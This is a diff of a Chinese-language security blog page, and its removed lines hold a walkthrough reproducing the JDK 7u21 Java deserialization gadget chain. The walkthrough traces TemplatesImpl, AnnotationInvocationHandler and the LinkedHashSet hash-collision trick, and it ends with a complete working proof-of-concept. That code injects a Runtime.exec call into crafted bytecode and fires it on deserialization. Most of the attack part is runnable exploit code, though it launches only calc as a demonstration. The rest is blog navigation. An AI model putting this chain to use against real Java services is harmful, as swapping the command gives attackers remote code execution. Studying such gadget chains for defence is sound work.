-<p>一步步调试发现在<code>AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance();</code>弹出calc<br><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20201004163506.png" alt="image466"><br>第380行是触发命令执行的点</p>
-<h2 id="newInstance"><a href="#newInstance" class="headerlink" title="newInstance"></a>newInstance</h2><pre><code class="java">public class instance {
-    static{
-        try {
-            Runtime.getRuntime().exec(&quot;calc.exe&quot;);
-        } catch (IOException e) {
-            e.printStackTrace();
-        }
-    }
-    public static void main(String args[]){
-        try {
-            instance.class.newInstance();
-        } catch (InstantiationException e) {
-            e.printStackTrace();
-        } catch (IllegalAccessException e) {
-            e.printStackTrace();
-        }
-
-    }
-}
-
-</code></pre>
-<p>将恶意代码放在static或构造方法中便可以在初始化时执行恶意代码</p>
-<h2 id="getTransletInstance"><a href="#getTransletInstance" class="headerlink" title="getTransletInstance"></a>getTransletInstance</h2><p>逐句执行观察到命令执行的限制条件与getOutputProperties和newTransformer没有太大关系<br>在getTransletInstance中发现一系列的限制</p>
-<pre><code class="java">private Translet getTransletInstance()
-        throws TransformerConfigurationException {
-        try {
-            if (_name == null) return null;//TemplatesImpl._name!=null
-
-            if (_class == null) defineTransletClasses();//TemplatesImpl._class==null
-
-            // The translet needs to keep a reference to all its auxiliary
-            // class to prevent the GC from collecting them
-            AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance();//_transletIndex在defineTransletClasses中定义
-            translet.postInitialization();
-            translet.setTemplates(this);
-            translet.setServicesMechnism(_useServicesMechanism);
-            if (_auxClasses != null) {
-                translet.setAuxiliaryClasses(_auxClasses);
-            }
-
-            return translet;
-        }
-        catch (InstantiationException e) {
-            ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name);
-            throw new TransformerConfigurationException(err.toString());
-        }
-        catch (IllegalAccessException e) {
-            ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name);
-            throw new TransformerConfigurationException(err.toString());
-        }
-    }</code></pre>
-<p>TemplatesImpl._name!=null和TemplatesImpl._class==null是执行到newInstance处的必要条件<br>而_transletIndex也是在defineTransletClasses中定义<br>跟进defineTransletClasses查找进一步的限制条件</p>
-<h2 id="defineTransletClasses"><a href="#defineTransletClasses" class="headerlink" title="defineTransletClasses"></a>defineTransletClasses</h2><pre><code class="java">private void defineTransletClasses()
-        throws TransformerConfigurationException {
-
-        if (_bytecodes == null) {//_bytecodes!=null
-            ErrorMsg err = new ErrorMsg(ErrorMsg.NO_TRANSLET_CLASS_ERR);
-            throw new TransformerConfigurationException(err.toString());
-        }
-
-        TransletClassLoader loader = (TransletClassLoader)
-            AccessController.doPrivileged(new PrivilegedAction() {
-                public Object run() {
-                    return new TransletClassLoader(ObjectFactory.findClassLoader());
-                }
-            });
-
-        try {
-            final int classCount = _bytecodes.length;
-            _class = new Class[classCount];
-
-            if (classCount &gt; 1) {
-                _auxClasses = new Hashtable();
-            }
-
-            for (int i = 0; i &lt; classCount; i++) {
-                _class[i] = loader.defineClass(_bytecodes[i]);
-                final Class superClass = _class[i].getSuperclass();
-
-                // Check if this is the main class
-                if (superClass.getName().equals(ABSTRACT_TRANSLET)) {
-                    _transletIndex = i;
-                }//_class.superClass==com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet
-                else {
-                    _auxClasses.put(_class[i].getName(), _class[i]);
-                }
-            }
-
-            ...
-        }
-        ...
-    }</code></pre>
-<p>阅读代码发现<code>_class[i] = loader.defineClass(_bytecodes[i]);</code>加载了我们的恶意类，但是它必须是<code>com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</code>的子类<br>_bytecodes!=null<br>综上我们可以得知要执行到恶意代码的触发点需要满足以下条件</p>
-<pre><code>1. TemplatesImpl._name!=null
-2. TemplatesImpl._class==null
-3. _bytecodes!=null
-4. 恶意类是`com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet`的子类
-5. TemplatesImpl类中的_tfactory变量需要有一个getExternalExtensionsMap方法（其他版本的限制条件）</code></pre><p>关于第五点的相关代码是(与7u21略有不同)：</p>
-<pre><code class="java">TransletClassLoader loader = (TransletClassLoader)
-            AccessController.doPrivileged(new PrivilegedAction() {
-                public Object run() {
-                    return new 
-        //限制条件4：TemplatesImpl类中的_tfactory变量需要有一个getExternalExtensionsMap方法
-        //           即需要是一个TransformerFactoryImpl类
-   TransletClassLoader(ObjectFactory.findClassLoader(),_tfactory.getExternalExtensionsMap());
-                }
-            });</code></pre>
-<h2 id="尝试自己写一个POC"><a href="#尝试自己写一个POC" class="headerlink" title="尝试自己写一个POC"></a>尝试自己写一个POC</h2><h3 id="Gadgets-createTemplatesImpl"><a href="#Gadgets-createTemplatesImpl" class="headerlink" title="Gadgets.createTemplatesImpl"></a>Gadgets.createTemplatesImpl</h3><p>跟进</p>
-<pre><code class="java">public static TemplatesImpl createTemplatesImpl(final String command) throws Exception {
-        final TemplatesImpl templates = new TemplatesImpl();
-
-        // use template gadget class
-        ClassPool pool = ClassPool.getDefault();
-        pool.insertClassPath(new ClassClassPath(StubTransletPayload.class));
-        final CtClass clazz = pool.get(StubTransletPayload.class.getName());
-        // run command in static initializer
-        clazz.makeClassInitializer()
-                .insertAfter(&quot;java.lang.Runtime.getRuntime().exec(\&quot;&quot;
-                        + command.replaceAll(&quot;\&quot;&quot;, &quot;\\\&quot;&quot;)
-                        + &quot;\&quot;);&quot;);
-        // unique name to allow repeated execution (watch out for PermGen exhaustion)
-        clazz.setName(&quot;ysoserial.Pwner&quot; + System.nanoTime());//Sets the class name
-
-        final byte[] classBytes = clazz.toBytecode();
-
-        // inject class bytes into instance
-        Reflections.setFieldValue(templates, &quot;_bytecodes&quot;, new byte[][] {
-                classBytes,
-                ClassFiles.classAsBytes(Foo.class)});
-//                  classBytes});
-        // required to make TemplatesImpl happy
-        Reflections.setFieldValue(templates, &quot;_name&quot;, &quot;Pwnr&quot;);
-//        Reflections.setFieldValue(templates, &quot;_tfactory&quot;, new TransformerFactoryImpl());
-        Reflections.setFieldValue(templates, &quot;_tfactory&quot;, new TransformerFactoryImpl());
-        return templates;
-    }</code></pre>
-<p>其中clazz是我们的恶意类装在templates的_bytecodes中，templates满足了其他的限制条件<br>这里用了javassist来构造我们的恶意类</p>
-<h3 id="javassist简介"><a href="#javassist简介" class="headerlink" title="javassist简介"></a>javassist简介</h3><p><a href="https://www.cnblogs.com/rickiyang/p/11336268.html" target="_blank" rel="noopener">https://www.cnblogs.com/rickiyang/p/11336268.html</a></p>
-<pre><code class="java">
-    ClassPool pool = ClassPool.getDefault();
-    pool.insertClassPath(new ClassClassPath(StubTransletPayload.class));
-    final CtClass clazz = pool.get(StubTransletPayload.class.getName());
-    clazz.makeClassInitializer()//Makes an empty class initializer (static constructor).
-                    .insertAfter(&quot;java.lang.Runtime.getRuntime().exec(\&quot;&quot;
-                            + command.replaceAll(&quot;\&quot;&quot;, &quot;\\\&quot;&quot;)
-                            + &quot;\&quot;);&quot;);//在方法后面添加代码
-    clazz.setName(&quot;ysoserial.Pwner&quot; + System.nanoTime());</code></pre>
-<h3 id="自己实现"><a href="#自己实现" class="headerlink" title="自己实现"></a>自己实现</h3><pre><code class="java">public class myjdk7u21 {
-    public static class evil extends com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet implements Serializable{
-
-        @Override
-        public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
-
-        }
-
-        @Override
-        public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
-
-        }
-
-    }
-    public static void main(String args[]) throws NotFoundException, CannotCompileException, NoSuchFieldException, IllegalAccessException, IOException {
-        ClassPool pool = ClassPool.getDefault();
-        pool.insertClassPath(new ClassClassPath(evil.class));
-        CtClass evilobj = pool.get(evil.class.getName());
-        evilobj.makeClassInitializer().insertAfter(&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;);
-        evilobj.setName(&quot;ccreater233&quot;+System.nanoTime());
-
-        final TemplatesImpl tpl = new TemplatesImpl();
-        setField(TemplatesImpl.class,tpl,&quot;_name&quot;,&quot;ccreater&quot;);
-        setField(TemplatesImpl.class,tpl,&quot;_class&quot;,null);
-        setField(TemplatesImpl.class,tpl,&quot;_bytecodes&quot;,new byte[][]{evilobj.toBytecode()});
-        tpl.getOutputProperties();
-
-    }
-    public static void setField(Class clazz,Object obj,String key,Object value) throws NoSuchFieldException, IllegalAccessException {
-        Field field = clazz.getDeclaredField(key);
-        field.setAccessible(true);
-        field.set(obj,value);
-    }
-}
-</code></pre>
-<p>遇到的坑：evil记得声明为public，不然默认是private,就无法newInstance了</p>
-<h2 id="动态代理AnnotationInvocationHandler"><a href="#动态代理AnnotationInvocationHandler" class="headerlink" title="动态代理AnnotationInvocationHandler"></a>动态代理AnnotationInvocationHandler</h2><p>利用动态代理来接近反序列化后直接RCE的目的</p>
-<pre><code class="java">        final Constructor&lt;?&gt; ctor = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;).getDeclaredConstructors()[0];
-        ctor.setAccessible(true);
-        InvocationHandler invocationHandler = (InvocationHandler) ctor.newInstance(Templates.class,new HashMap());
-
-        TempInt proxy = (TempInt)Proxy.newProxyInstance(TempInt.class.getClassLoader(),new Class[]{TempInt.class},invocationHandler);
-        proxy.equals(tpl);</code></pre>
-<p>我们看下AnnotationInvocationHandler的构造方法</p>
-<pre><code class="java">AnnotationInvocationHandler(Class&lt;? extends Annotation&gt; var1, Map&lt;String, Object&gt; var2) {
-        this.type = var1;
-        this.memberValues = var2;
-    }</code></pre>
-<p>type和memberValues皆可控</p>
-<p>debug跟进<br>proxy.equals 调用了动态代理AnnotationInvocationHandler的invoke方法</p>
-<pre><code class="java">    public Object invoke(Object var1, Method var2, Object[] var3) {
-            String var4 = var2.getName();
-            Class[] var5 = var2.getParameterTypes();
-            if (var4.equals(&quot;equals&quot;) &amp;&amp; var5.length == 1 &amp;&amp; var5[0] == Object.class) {
-                return this.equalsImpl(var3[0]);
-            }
-            ...
-    }</code></pre>
-<p>方法名为equals且只有一个参数，这进入<code>this.equalsImpl(var3[0]);</code></p>
-<p>equalsImpl</p>
-<pre><code class="java">private Boolean equalsImpl(Object var1) {
-        if (var1 == this) {
-            return true;
-        } else if (!this.type.isInstance(var1)) {
-            return false;
-        } else {
-            Method[] var2 = this.getMemberMethods();
-            int var3 = var2.length;
-
-            for(int var4 = 0; var4 &lt; var3; ++var4) {
-                Method var5 = var2[var4];
-                String var6 = var5.getName();
-                Object var7 = this.memberValues.get(var6);
-                Object var8 = null;
-                AnnotationInvocationHandler var9 = this.asOneOfUs(var1);
-                if (var9 != null) {
-                    var8 = var9.memberValues.get(var6);
-                } else {
-                    try {
-                        var8 = var5.invoke(var1);
-                    } catch (InvocationTargetException var11) {
-                        return false;
-                    } catch (IllegalAccessException var12) {
-                        throw new AssertionError(var12);
-                    }
-                }...
-            }
-        }
-    }</code></pre>
-<p>在这个方法中调用了<code>var8 = var5.invoke(var1);</code>,相当于var1.var5(),其中var1是a.equals(b)中的b<br>var5是this.type的第一个方法(this.getMemberMethods()[0])<br>跟进getMemberMethods</p>
-<pre><code class="java">private Method[] getMemberMethods() {
-        if (this.memberMethods == null) {
-            this.memberMethods = (Method[])AccessController.doPrivileged(new PrivilegedAction&lt;Method[]&gt;() {
-                public Method[] run() {
-                    Method[] var1 = AnnotationInvocationHandler.this.type.getDeclaredMethods();
-                    AccessibleObject.setAccessible(var1, true);
-                    return var1;
-                }
-            });
-        }
-
-        return this.memberMethods;
-    }</code></pre>
-<p>也就是说我们可以通过控制this.type从而调用xx.equals(evilObj),来达到evilObj.AnyMethod()的效果<br>这也恰好符合了我们想调用evilObj.getOutputProperties()情况<br>最后选择了Templates,它的第一个方法是newTransformer,漏洞点在newTransformer中触发</p>
-<h2 id="LinkedHashSet反序列化调用equals"><a href="#LinkedHashSet反序列化调用equals" class="headerlink" title="LinkedHashSet反序列化调用equals"></a>LinkedHashSet反序列化调用equals</h2><p>问我为啥知道这里可以，答：别人发现的<br>LinkedHashSet没有实现readObject方法而是调用了HashSet的readObject方法，既然如此，为啥不直接调用HashSet嘞<br>等下就知道了<br>HashSet::readObject</p>
-<pre><code class="java">private void readObject(java.io.ObjectInputStream s)
-        throws java.io.IOException, ClassNotFoundException {
-        // Read in any hidden serialization magic
-        s.defaultReadObject();
-
-        // Read in HashMap capacity and load factor and create backing HashMap
-        int capacity = s.readInt();
-        float loadFactor = s.readFloat();
-        map = (((HashSet)this) instanceof LinkedHashSet ?
-               new LinkedHashMap&lt;E,Object&gt;(capacity, loadFactor) :
-               new HashMap&lt;E,Object&gt;(capacity, loadFactor));
-
-        // Read in size
-        int size = s.readInt();
-
-        // Read in all elements in the proper order.
-        for (int i=0; i&lt;size; i++) {
-            E e = (E) s.readObject();
-            map.put(e, PRESENT);
-        }
-    }</code></pre>
-<p>跟进HashMap::put方法</p>
-<pre><code class="java">public V put(K key, V value) {
-        if (key == null)
-            return putForNullKey(value);
-        int hash = hash(key);
-        int i = indexFor(hash, table.length);
-        for (Entry&lt;K,V&gt; e = table[i]; e != null; e = e.next) {
-            Object k;
-            if (e.hash == hash &amp;&amp; ((k = e.key) == key || key.equals(k))) {
-                V oldValue = e.value;
-                e.value = value;
-                e.recordAccess(this);
-                return oldValue;
-            }
-        }
-
-        modCount++;
-        addEntry(hash, key, value, i);
-        return null;
-    }</code></pre>
-<p>我们看到key.equals(k)完美的符合了我们的预期<br>这里得是顺序调用才能常出现proxy.equals(evilObj),所以用了LinkedHashSet<br>但是在这之前我们要满足两个条件</p>
-<ol>
-<li>e.hash == hash即hash(proxy) == hash(evilObj)</li>
-<li>e.key!=key即proxy!=evilObj<br>第二个条件很容易满足，第一个条件就GG了<br>跟进int hash = hash(key);中的hash方法看一下发现</li>
-</ol>
-<pre><code class="java">final int hash(Object k) {
-        int h = 0;
-        if (useAltHashing) {
-            if (k instanceof String) {
-                return sun.misc.Hashing.stringHash32((String) k);
-            }
-            h = hashSeed;
-        }
-
-        h ^= k.hashCode();
-
-        // This function ensures that hashCodes that differ only by
-        // constant multiples at each bit position have a bounded
-        // number of collisions (approximately 8 at default load factor).
-        h ^= (h &gt;&gt;&gt; 20) ^ (h &gt;&gt;&gt; 12);
-        return h ^ (h &gt;&gt;&gt; 7) ^ (h &gt;&gt;&gt; 4);
-    }</code></pre>
-<p>调用了key的hashCode方法，即进入了AnnotationInvocationHandler的invoke方法<br>见证奇迹的时刻：<br>在invoke中有这样的一句话：</p>
-<pre><code>if (var4.equals(&quot;hashCode&quot;)) {
-    return this.hashCodeImpl();</code></pre><p>跟进hashCodeImpl</p>
-<pre><code class="java">    private int hashCodeImpl() {
-        int var1 = 0;
-
-        Entry var3;
-        for(Iterator var2 = this.memberValues.entrySet().iterator(); var2.hasNext(); var1 += 127 * ((String)var3.getKey()).hashCode() ^ memberValueHashCode(var3.getValue())) {
-            var3 = (Entry)var2.next();
-        }
-
-        return var1;
-    }</code></pre>
-<p>我们关注<code>var1 += 127 * ((String)var3.getKey()).hashCode() ^ memberValueHashCode(var3.getValue())</code><br>这相当于<code>127*key.hashcode()^Arrays.hashCode((Object[])((Object[])value))</code><br>因为0^x=x,且<em>优先级大于^,所以令key.hashcode()=0使得e.hash == hash最终变成<br>127</em>key.hashcode()^Arrays.hashCode((Object[])((Object[])value))=0^value.hashcode()==value.hashcode()<br>所以构造</p>
-<pre><code class="java">package org.example;
-import com.sun.org.apache.xalan.internal.xsltc.DOM;
-import com.sun.org.apache.xalan.internal.xsltc.TransletException;
-import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
-import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
-import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
-import javassist.*;
-
-import javax.xml.transform.Templates;
-import java.io.*;
-import java.lang.reflect.*;
-import java.util.HashMap;
-import java.util.HashSet;
-import java.util.LinkedHashSet;
-
-import static com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.DESERIALIZE_TRANSLET;
-
-
-public class myjdk7u21 {
-
-    public static class evil extends com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet implements Serializable{
-
-        @Override
-        public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
-
-        }
-
-        @Override
-        public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
-
-        }
-
-    }
-
-    public static void main(String args[]) throws Exception {
-        ClassPool pool = ClassPool.getDefault();
-        pool.insertClassPath(new ClassClassPath(evil.class));
-        CtClass evilobj = pool.get(evil.class.getName());
-        evilobj.makeClassInitializer().insertAfter(&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;);
-        evilobj.setName(&quot;ccreater233&quot;+System.nanoTime());
-
-        final TemplatesImpl tpl = new TemplatesImpl();
-        setField(TemplatesImpl.class,tpl,&quot;_name&quot;,&quot;ccreater&quot;);
-        setField(TemplatesImpl.class,tpl,&quot;_class&quot;,null);
-        setField(TemplatesImpl.class,tpl,&quot;_bytecodes&quot;,new byte[][]{evilobj.toBytecode()});
-        //evil instance
-
-        //tpl.getOutputProperties();
-        final Constructor&lt;?&gt; ctor = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;).getDeclaredConstructors()[0];
-        ctor.setAccessible(true);
-        HashMap map = new HashMap();
-        map.put(&quot;f5a5a608&quot;,&quot;23333&quot;);
-        InvocationHandler invocationHandler = (InvocationHandler) ctor.newInstance(Templates.class,map);
-
-        TempInt proxy = (TempInt)Proxy.newProxyInstance(TempInt.class.getClassLoader(),new Class[]{TempInt.class},invocationHandler);
-
-        HashSet a = new LinkedHashSet();
-        a.add(tpl);
-        a.add(proxy);
-        map.put(&quot;f5a5a608&quot;,tpl);
-
-        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
-        //序列化
-        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
-        objectOutputStream.writeObject(a);//序列化对象
-        objectOutputStream.flush();
-        objectOutputStream.close();
-        //反序列化
-        byte[] bytes = byteArrayOutputStream.toByteArray(); //读取序列化后的对象byte数组
-        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(bytes);//存放byte数组的输入流
-        ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);
-        Object o = objectInputStream.readObject();
-
-    }
-    public static void setField(Class clazz,Object obj,String key,Object value) throws NoSuchFieldException, IllegalAccessException {
-        Field field = clazz.getDeclaredField(key);
-        field.setAccessible(true);
-        field.set(obj,value);
-    }
-}
-</code></pre>
-<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="http://blog.ccreater.top/2020/10/04/jdk7u21反序列化复现/">http://blog.ccreater.top/2020/10/04/jdk7u21反序列化复现/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://blog.ccreater.top/2020/10/04/jdk7u21%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%8D%E7%8E%B0/" data-id="ckfv69maa0000tovda4n430sl" data-title="jdk7u21反序列化复现" class="article-share-link">Share</a>
-      
-	  
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/java/" rel="tag">java</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/" rel="tag">web</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-
-
-
-  
 
 
   <nav id="page-nav">
@@ -2747,6 +2870,10 @@ public class myjdk7u21 {
       <ul>
         
           <li>
+            <a href="/2020/11/24/2020%E7%A5%A5%E4%BA%91%E6%9D%AFweb%E9%A2%98%E8%A7%A3/">2020祥云杯web题解</a>
+          </li>
+        
+          <li>
             <a href="/2020/11/13/XNUCA_2020_oooooooldjs%E9%A2%98%E8%A7%A3/">XNUCA_2020_oooooooldjs题解</a>
           </li>
         
@@ -2760,10 +2887,6 @@ public class myjdk7u21 {
         
           <li>
             <a href="/2020/10/20/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22020wp/">巅峰极客2020wp</a>
-          </li>
-        
-          <li>
-            <a href="/2020/10/20/LFI%E5%88%A9%E7%94%A8php%E8%87%AA%E5%B8%A6%E7%9A%84pearcmd.php%E7%9B%B4%E6%8E%A5RCE/">LFI利用php自带的pearcmd.php直接RCE</a>
           </li>
         
       </ul>
